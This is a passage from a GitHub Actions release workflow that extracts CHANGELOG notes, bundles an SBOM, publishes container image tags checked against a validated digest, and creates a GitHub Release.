      # `ecr_enabled` / `ecr_image` outputs emitted by the meta step
      # remain wired so a future operator can verify the re-enable
      # works end-to-end without rewiring. Tracked under #212 (the
      # canonical re-enable runbook). Cosign-sign ECR branch (above
      # in the `Sign image with cosign` step) follows the same
      # pattern: `if [ "${{ steps.meta.outputs.ecr_enabled }}" = "true" ]`
      # is dead until ECR is re-enabled; left in-tree for the same
      # one-step uncomment.
      #
      # - name: Attach SBOM attestation to ECR Public image
      #   if: ${{ steps.meta.outputs.ecr_enabled == 'true' }}
      #   uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
      #   with:
      #     subject-name: ${{ steps.meta.outputs.ecr_image }}
      #     subject-digest: ${{ steps.digest.outputs.digest }}
      #     sbom-path: sbom.cyclonedx.json
      #     push-to-registry: true

      # Extract the CHANGELOG.md section for this version so
      # the GitHub Release body mirrors the existing markdown.
      # The awk pattern ignores any `## [Unreleased]` block
      # (defensive against the duplicate that lived in the
      # changelog once) and stops at the next `## [...]`
      # heading or the compare-link footer. The body is
      # written to a deterministic path inside the bundle so
      # the `publish` job can find it without re-running the
      # awk.
      - name: Extract CHANGELOG notes for this version
        id: notes
        run: |
          set -euo pipefail
          version="${{ steps.meta.outputs.version }}"
          # A pre-release (X.Y.Z-rc.N) uses the final release's
          # CHANGELOG [X.Y.Z] section, as it uses its VERSION.
          version="${version%%-*}"
          notes=$(awk -v v="${version}" '
              BEGIN {
                  in_section = 0
                  v_escaped = v
                  gsub(/\./, "\\.", v_escaped)
                  heading_re = "^## \\[" v_escaped "\\]( -.*)?$"
                  next_heading_re = "^## \\["
                  compare_re = "^\\[[0-9]+\\.[0-9]+\\.[0-9]+\\]:"
              }
              $0 ~ heading_re { in_section = 1; next }
              in_section && $0 ~ next_heading_re { exit }
              in_section && $0 ~ compare_re { exit }
              in_section { print }
          ' CHANGELOG.md)
          ART_DIR="${{ runner.temp }}/release-artifacts"
          mkdir -p "${ART_DIR}"
          if [ -z "${notes}" ]; then
            echo "::warning::no CHANGELOG section found for ${version}; falling back to generate_release_notes"
            touch "${ART_DIR}/body-empty"
          else
            printf '%s\n' "${notes}" > "${ART_DIR}/CHANGELOG.body.md"
            echo "wrote $(wc -l < "${ART_DIR}/CHANGELOG.body.md") lines to CHANGELOG.body.md"
          fi

      # Bundle the SBOM + CHANGELOG body so `publish` can pick
      # them up without re-running the work. Mirrors moagan's
      # bundle step.
      - name: Bundle artefacts for the publisher job
        run: |
          set -euo pipefail
          cp sbom.cyclonedx.json "${{ runner.temp }}/release-artifacts/"
          ls -la "${{ runner.temp }}/release-artifacts/"

      - name: Upload bundle for the publisher job
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: ftp-deployment-action-release-bundle
          path: ${{ runner.temp }}/release-artifacts/
          retention-days: 7
          if-no-files-found: error

      # Last image step: only now do the public tags move. Each tag
      # in `all_tags` is created from the SAME registry's
      # <image>@<digest> (the repository part of the tag itself,
      # which must be one of the names the build pushed to), so no
      # tag is copied across registries. :X.Y.Z and :vX.Y.Z go
      # first in every registry, :latest last, and :latest is
      # refused for a pre-release. After each create the tag is
      # inspected and must resolve to the validated digest: whether
      # `imagetools create` keeps the digest of a single-source
      # index is not something this file relies on; this check is
      # the guard.
      - name: Publish the release tags (version tags first, :latest last)
        id: publish-tags
        env:
          DIGEST: ${{ steps.digest.outputs.digest }}
          ALL_TAGS: ${{ steps.meta.outputs.all_tags }}
          IMAGE_NAMES: ${{ steps.meta.outputs.image_names }}
          PRE_RELEASE: ${{ steps.meta.outputs.pre_release }}
        run: |
          set -euo pipefail
          if ! [[ "${DIGEST}" =~ ^sha256:[0-9a-f]{64}$ ]]; then
            echo "::error::digest '${DIGEST}' is not sha256: followed by 64 lowercase hex characters"
            exit 1
          fi
          case "${PRE_RELEASE}" in
            true|false) ;;
            *) echo "::error::pre_release is '${PRE_RELEASE}', expected true or false"; exit 1 ;;
          esac

          # publish_tag <repo>:<tag>: point the tag at <repo>@DIGEST
          # and fail unless the registry now resolves it to DIGEST.
          publish_tag() {
            local ref="$1" repo got
            repo="${ref%:*}"
            docker buildx imagetools create --tag "${ref}" "${repo}@${DIGEST}"
            got=$(docker buildx imagetools inspect "${ref}" --format '{{json .Manifest}}' | jq -r '.digest // empty')
            if [ "${got}" != "${DIGEST}" ]; then
              echo "::error::${ref} resolves to '${got}', expected ${DIGEST}"
              return 1
            fi
            echo "✓ ${ref} -> ${DIGEST}"
          }

          version_tags=()
          latest_tags=()
          while IFS= read -r ref; do
            [ -n "${ref}" ] || continue
            # Checked for every tag before the first create.
            case ",${IMAGE_NAMES}," in
              *",${ref%:*},"*) ;;
              *) echo "::error::${ref}: ${ref%:*} is not one of the pushed images (${IMAGE_NAMES})"; exit 1 ;;
            esac
            case "${ref}" in
              *:latest) latest_tags+=("${ref}") ;;
              *) version_tags+=("${ref}") ;;
            esac
          done <<< "${ALL_TAGS}"
          if [ "${#version_tags[@]}" -eq 0 ]; then
            echo "::error::all_tags holds no version tag"
            exit 1
          fi
          if [ "${PRE_RELEASE}" = true ] && [ "${#latest_tags[@]}" -ne 0 ]; then
            echo "::error::pre-release must not publish :latest (${latest_tags[*]})"
            exit 1
          fi

          for ref in "${version_tags[@]}"; do
            publish_tag "${ref}"
          done
          for ref in "${latest_tags[@]}"; do
            publish_tag "${ref}"
          done

  # Job 5: publish. Creates the GitHub Release page from the
  # CHANGELOG section extracted by `build`. `contents: write`
  # is scoped to this job; the rest of the pipeline does not
  # need it.
  publish:
    name: 'Publish · GitHub Release'
    needs: [validate-tag-input, build]
    runs-on: ubuntu-latest
    timeout-minutes: 10
    permissions:
      contents: write
    steps:
      - name: Download bundle
        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: ftp-deployment-action-release-bundle
          path: release/

      - name: Extract metadata
        id: meta
        env:
          INPUT_VERSION: ${{ needs.validate-tag-input.outputs.tag }}
        run: |
          set -euo pipefail
          TAG="${INPUT_VERSION:-${GITHUB_REF_NAME}}"
          if [ -f release/body-empty ]; then
            body=""
            body_empty=true
          else
            body="$(cat release/CHANGELOG.body.md)"
            body_empty=false
          fi
          # Random delimiter (GitHub's documented guidance for
          # multi-line values): a CHANGELOG line that is exactly
          # `EOF` would end a fixed `EOF` value early.
          delim="EOF_$(openssl rand -hex 16)"
          {
            echo "tag=${TAG}"
            echo "version=${TAG#v}"
            echo "body-empty=${body_empty}"
            echo "body<<${delim}"
            printf '%s\n' "${body}"
            echo "${delim}"
          } >> "$GITHUB_OUTPUT"

      # Create the GitHub Release. Pre-release tags must not become the
      # repository's Latest release or replace the stable notification target.
      # If `build` did not find a CHANGELOG section,
      # `generate_release_notes` builds the body from the tag
      # delta as a fallback. `fail_on_unmatched_files: true`
      # (moagan's hardening) aborts the publish if the bundle
      # is missing the expected SBOM.
      # v2.11.10 (#293): `body_path` previously collapsed to `''`
      # when `body-empty == 'true'`, which `softprops/action-gh-release`
      # interpreted as the cwd and tried to read `body.md` from there
      # (failing), then escalated via `fail_on_unmatched_files: true`.
      # Switch to `body:` (content carried through the `meta` step's
      # heredoc output) so the empty-body case is a clean empty string
      # rather than a filesystem lookup. `fail_on_unmatched_files` is
      # still true when a body IS expected (so a missing SBOM still
      # fails the publish), and false when the body is intentionally
      # empty (so the SBOM-missing failure mode doesn't shadow the
      # generate_release_notes fallback).
      - name: Create GitHub Release
        uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        with:
          tag_name: ${{ steps.meta.outputs.tag }}
          name: ${{ steps.meta.outputs.tag }}
          prerelease: ${{ contains(steps.meta.outputs.tag, '-') }}
          make_latest: ${{ !contains(steps.meta.outputs.tag, '-') }}
          generate_release_notes: ${{ steps.meta.outputs.body-empty == 'true' }}
          body: ${{ steps.meta.outputs.body }}
          files: |
            release/sbom.cyclonedx.json
          fail_on_unmatched_files: ${{ steps.meta.outputs.body-empty != 'true' }}
